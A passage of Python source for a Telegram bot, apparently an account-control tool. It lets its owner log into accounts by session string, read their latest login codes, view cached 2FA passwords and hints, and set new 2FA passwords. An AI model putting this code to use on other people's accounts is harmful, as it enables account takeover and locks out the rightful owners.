async def fetch_otp_handler(event):
    if not is_authorized(event.sender_id):
        return await event.reply("⛔ **ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ:** ʏᴇʜ ʙᴏᴛ ꜱɪʀꜰ ᴏᴡɴᴇʀ ᴀᴜʀ ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ ᴋᴇ ʟɪʏᴇ ʜᴀɪ.")

    user_id = event.sender_id
    client = active_clients.get(user_id)
    if not client:
        return await event.reply("❌ **ᴘᴇʜʟᴇ `/login <string/number>` ꜱᴇ ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ.**")

    try:
        me = await client.get_me()
        await event.reply("⏳ **3 ꜱᴇᴄ ᴡᴀɪᴛ ᴋʀᴏ, ᴏᴛᴘ ʙʜᴇᴊ ʀᴀʜᴀ ʜᴏᴏɴ...**")
        await asyncio.sleep(3)
        await send_latest_otp(client, user_id, str(me.phone))
    except Exception as exc:
        await event.reply(f"❌ **ᴏᴛᴘ ꜰᴇᴛᴄʜ ᴇʀʀᴏʀ:** `{str(exc)}`")


@bot.on(events.NewMessage(pattern=r"^/check(?:@\w+)?$", func=lambda e: e.is_private))
async def check_account_handler(event):
    if not is_authorized(event.sender_id):
        return await event.reply("⛔ **ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ:** ʏᴇʜ ʙᴏᴛ ꜱɪʀꜰ ᴏᴡɴᴇʀ ᴀᴜʀ ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ ᴋᴇ ʟɪʏᴇ ʜᴀɪ.")

    user_id = event.sender_id
    client = active_clients.get(user_id)
    if not client:
        return await event.reply("❌ **ᴘᴇʜʟᴇ `/login <string/number>` ꜱᴇ ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ.**")

    try:
        me = await client.get_me()
        pwd_info = await client(GetPasswordRequest())
        has_2fa = "Enabled (Existing password cannot be fetched)" if pwd_info.has_password else "Disabled"
        hint = pwd_info.hint if pwd_info.hint else "None"

        await event.reply(
            f"📋 **ᴀᴄᴄᴏᴜɴᴛ ꜱᴛᴀᴛᴜꜱ**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• **Name:** {me.first_name or ''} {me.last_name or ''}\n"
            f"• **Phone:** `+{me.phone}`\n"
            f"• **User ID:** `{me.id}`\n"
            f"• **2FA Status:** `{has_2fa}`\n"
            f"• **2FA Hint:** `{hint}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
    except Exception as exc:
        await event.reply(f"❌ **ᴄʜᴇᴄᴋ ᴇʀʀᴏʀ:** `{str(exc)}`")


@bot.on(events.NewMessage(pattern=r"^/2fa(?:@\w+)?$", func=lambda e: e.is_private))
async def two_fa_handler(event):
    if not is_authorized(event.sender_id):
        return await event.reply("⛔ **ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ:** ʏᴇʜ ʙᴏᴛ ꜱɪʀꜰ ᴏᴡɴᴇʀ ᴀᴜʀ ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ ᴋᴇ ʟɪʏᴇ ʜᴀɪ.")

    user_id = event.sender_id
    client = active_clients.get(user_id)
    if not client:
        return await event.reply("❌ **ᴘᴇʜʟᴇ `/login <string/number>` ꜱᴇ ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ.**")

    try:
        pwd_info = await client(GetPasswordRequest())
        hint = pwd_info.hint if pwd_info.hint else "None"

        if pwd_info.has_password:
            session_pwd = cached_2fa_passwords.get(user_id)
            pwd_line = (
                f"• **Current Session Password:** `{session_pwd}`\n"
                if session_pwd
                else "• **Present Password:** `Telegram does not allow fetching existing 2FA password`\n"
            )
            await event.reply(
                f"🔐 **2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ɪɴꜰᴏ**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"• **Status:** `Enabled`\n"
                f"• **Hint:** `{hint}`\n"
                f"{pwd_line}"
                f"━━━━━━━━━━━━━━━━━━━━━━"
            )
        else:
            pending_2fa_set[user_id] = True
            await event.reply(
                f"🔓 **ɪꜱ ᴀᴄᴄᴏᴜɴᴛ ᴘᴀʀ 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ꜱᴇᴛ ɴᴀʜɪ ʜᴀɪ (`Hint: {hint}`).**\n\n"
                f"ᴀɢᴀʀ ᴀʙʜɪ ɴᴀʏᴀ 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ꜱᴇᴛ ᴋᴀʀɴᴀ ʜᴀɪ ᴛᴏ ᴡᴏʜ ᴘᴀꜱꜱᴡᴏʀᴅ ʏᴀʜᴀɴ ʙʜᴇᴊᴇɪɴ:"
            )
    except Exception as exc:
        await event.reply(f"❌ **2ꜰᴀ ᴇʀʀᴏʀ:** `{str(exc)}`")


@bot.on(events.NewMessage(pattern=r"^/logout(?:@\w+)?$", func=lambda e: e.is_private))
async def logout_handler(event):
    if not is_authorized(event.sender_id):
        return await event.reply("⛔ **ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ:** ʏᴇʜ ʙᴏᴛ ꜱɪʀꜰ ᴏᴡɴᴇʀ ᴀᴜʀ ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ ᴋᴇ ʟɪʏᴇ ʜᴀɪ.")

    user_id = event.sender_id
    sender = await event.get_sender()
    uname = f"@{sender.username}" if sender and sender.username else "No Username"

    if user_id in active_clients or user_id in pending_logins or user_id in pending_2fa_set:
        await cleanup_user_session(user_id)
        await event.reply("✅ **ꜱᴇꜱꜱɪᴏɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴅɪꜱᴄᴏɴɴᴇᴄᴛ ʜᴏ ɢᴀʏᴀ ʜᴀɪ.**")
        await send_log(
            f"🔴 **#LOGOUT**\n"
            f"• **User:** `{user_id}` ({uname})\n"
            f"• **Time:** `{now_ist()}`"
        )
    else:
        await event.reply("ℹ️ **ᴀʙʜɪ ᴀᴀᴘᴋᴀ ᴋᴏɪ ꜱᴇꜱꜱɪᴏɴ ᴀᴄᴛɪᴠᴇ ɴᴀʜɪ ʜᴀɪ.**")


async def main():
    await start_web_server()
    await bot.start(bot_token=BOT_TOKEN)
    print("@AutoView_all_bot started successfully.")
    await send_log(
        f"🚀 **#BOT_ONLINE**\n"
        f"• **Bot:** `@AutoView_all_bot`\n"
        f"• **Owner:** `@CoderNova` (`{OWNER_ID}`)\n"
        f"• **Time:** `{now_ist()}`"
    )
    await bot.run_until_disconnected()


if __name__ == "__main__":
    loop.run_until_complete(main())
